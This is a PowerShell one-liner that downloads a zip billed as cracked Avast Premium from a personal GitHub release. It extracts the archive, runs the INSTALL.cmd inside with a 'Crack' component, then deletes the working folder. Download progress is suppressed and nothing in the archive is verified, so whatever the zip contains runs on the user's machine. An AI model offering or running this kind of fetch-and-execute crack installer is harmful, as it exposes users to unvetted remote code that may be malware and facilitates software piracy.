$p="C:\phwyverysad"; $z="$p\avast_premium.zip"; $u="https://github.com/phwyverysad/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/avast_premium.zip"; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $oldP=$ProgressPreference; $ProgressPreference='SilentlyContinue'; if(!(Test-Path $p)){New-Item -ItemType Directory -Path $p -Force | Out-Null}; Write-Host "Downloading..."; try{(New-Object System.Net.WebClient).DownloadFile($u,$z); if(Test-Path $z){Write-Host "Extracting..."; Expand-Archive -Path $z -DestinationPath $p -Force; foreach($i in @("INSTALL.cmd","avast_premium_security_offline_setup.exe","Crack")){$s=Get-ChildItem -Path $p -Filter $i -Recurse | Where-Object {$_.Parent.FullName -ne $p} | Select-Object -First 1; if($s){Move-Item -Path $s.FullName -Destination (Join-Path $p $i) -Force}}; Remove-Item -Path $z -Force; $c=Join-Path $p "INSTALL.cmd"; if(Test-Path $c){Write-Host "Running Install..."; Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$c`"" -WorkingDirectory $p -Wait}}}catch{Write-Host "Error: $_"}finally{Write-Host "Cleaning up..."; Start-Sleep -Seconds 3; if(Test-Path $p){Remove-Item -Path $p -Recurse -Force -ErrorAction SilentlyContinue}; $ProgressPreference=$oldP; Write-Host "Done."}
